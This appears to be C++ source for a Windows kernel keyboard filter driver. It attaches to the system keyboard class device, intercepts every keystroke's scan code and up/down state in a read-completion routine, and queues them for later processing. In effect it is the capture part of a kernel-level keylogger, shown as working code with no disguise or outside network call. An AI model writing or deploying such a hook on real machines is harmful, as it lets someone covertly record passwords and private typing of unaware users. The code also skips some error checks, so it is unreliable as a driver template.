extern "C" {
#include "ntddk.h"
}
#include <kbdmou.h>
#include "ntddkbd.h"
#include "KbdHook.h"

extern int numPendingIrps;

NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject) {
	DbgPrint("Entering Hook Routine..\n");

	//Create the device.
	PDEVICE_OBJECT pKeyboardDeviceObject;
	NTSTATUS status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, true, &pKeyboardDeviceObject);
	if (!NT_SUCCESS(status)) return status;
	DbgPrint("Created keyboard device sucessfully.\n");

	//Set the flags.
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
	DbgPrint("Flags are set successfully.\n");

	//Initialize Device Extension.
	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	DbgPrint("Device Extension Initialized.\n");
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;

	//Convert to UNICODE string.
	CCHAR ntNameBuffer[64] = "\\Device\\KeyboardClass0"; //Path to top of deivce stack.
	STRING ntNameString;
	UNICODE_STRING uKeyboardDeviceName;
	RtlInitAnsiString(&ntNameString, ntNameBuffer);
	RtlAnsiStringToUnicodeString(&uKeyboardDeviceName, &ntNameString, TRUE);
	
	//Attach to the lower driver.
	IoAttachDevice(pKeyboardDeviceObject, &uKeyboardDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
	RtlFreeUnicodeString(&uKeyboardDeviceName); // Release alloc memory.
	DbgPrint("Filter Device attached successfully.\n");

	return STATUS_SUCCESS;
}

NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context) {
	DbgPrint("Entering read complete.\n");

	PDEVICE_EXTENSION pKeyboardDeviceObjectExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	if (pIrp->IoStatus.Status == STATUS_SUCCESS) {
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		for (int i = 0; i < numKeys; i++) {
			DbgPrint("ScanCode: %x\n", keys[i].MakeCode);
			if (keys[i].Flags == KEY_BREAK) DbgPrint("%s\n", "Key Up");
			if (keys[i].Flags == KEY_MAKE) DbgPrint("%s\n", "Key Down");

			KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
			kData->KeyData = (char)keys[i].MakeCode;
			kData->KeyFlags = (char)keys[i].Flags;

			DbgPrint("Adding IRP to work queue.");
			ExInterlockedInsertTailList(&pKeyboardDeviceObjectExtension->QueueListHead, &kData->ListEntry, &pKeyboardDeviceObjectExtension->lockQueue);

			KeReleaseSemaphore(&pKeyboardDeviceObjectExtension->semQueue, 0, 1, FALSE);
		}
	}

	if (pIrp->PendingReturned) IoMarkIrpPending(pIrp);
	numPendingIrps--;
	return pIrp->IoStatus.Status;
}
